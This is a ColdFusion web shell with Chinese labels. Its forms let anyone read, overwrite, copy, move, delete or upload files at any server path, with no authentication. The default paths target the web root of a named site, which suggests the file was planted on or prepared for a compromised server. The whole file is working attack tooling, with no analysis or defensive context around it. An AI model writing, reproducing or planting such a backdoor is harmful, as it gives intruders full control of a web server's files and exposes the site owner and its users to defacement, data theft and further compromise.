<CFPARAM NAME="Form.Action" DEFAULT="ShowPost">
<CFSWITCH EXPRESSION=#Form.Action#>

<CFCASE VALUE="read">
<CFFILE ACTION="Read" FILE="#Form.path#" VARIABLE="Message">
<CFOUTPUT>#htmlCodeFormat(Message)#</CFOUTPUT>
</CFCASE>

<CFCASE VALUE="write">
<CFFILE ACTION="Write" FILE="#Form.path#" OUTPUT="#Form.cmd#">
写入成功
</CFCASE>

<CFCASE VALUE="copy">
<CFFILE ACTION="Copy" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
复制成功
</CFCASE>

<CFCASE VALUE="move">
<CFFILE ACTION="MOVE" SOURCE="#Form.source#" DESTINATION="#Form.DESTINATION#">
移动成功
</CFCASE>

<CFCASE VALUE="delete">
<CFFILE ACTION="Delete" FILE="#Form.path#">
删除成功
</CFCASE>


<CFCASE VALUE="upload">
<CFFILE ACTION="UPLOAD" FILEFIELD="FileContents" DESTINATION="#Form.path#" NAMECONFLICT="OVERWRITE">

上传成功
</CFCASE>

<CFDEFAULTCASE>

<form action="" target="_blank" method=post>
<textarea style="width:600;height:200" name="cmd"></textarea><br>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72>
<input type=submit value="写入文件">
<input type=hidden name="action" value="write">
</form>
<br>

<form action="" target="_blank" method=post>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\index.cfm" size=72>
<input type=submit value="显示文件内容">
<input type=hidden name="action" value="read">
</form>
<br>

<FORM ACTION="" ENCTYPE="multipart/form-data" METHOD="Post" target="_blank">
传到哪里: <INPUT NAME="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72><br>
本地文件: <INPUT NAME="FileContents" TYPE="file" size=50>
<input type=hidden name="action" value="upload">
<INPUT TYPE="submit" VALUE="上传">
</FORM>

<br>

<form action="" target="_blank" method=post>
源文件：<input name="source" value="D:\INETPUB\DRS.COM\WWWROOT\images\source.htm" size=65><br>
复制到：<input name="DESTINATION" value="D:\INETPUB\DRS.COM\WWWROOT\images\DESTINATION.htm" size=65>
<input type=submit value="复制文件">
<input type=hidden name="action" value="copy">
</form>

<br>

<form action="" target="_blank" method=post>
源文件：<input name="source" value="D:\INETPUB\DRS.COM\WWWROOT\images\source.htm" size=65><br>
移动到：<input name="DESTINATION" value="D:\INETPUB\DRS.COM\WWWROOT\images\DESTINATION.htm" size=65>
<input type=submit value="移动文件">
<input type=hidden name="action" value="move">
</form>

<br>

<form action="" target="_blank" method=post>
<input name="path" value="D:\INETPUB\DRS.COM\WWWROOT\images\abc.htm" size=72>
<input type=submit value="删除指定文件">
<input type=hidden name="action" value="delete">
</form>

</CFDEFAULTCASE>

</CFSWITCH>
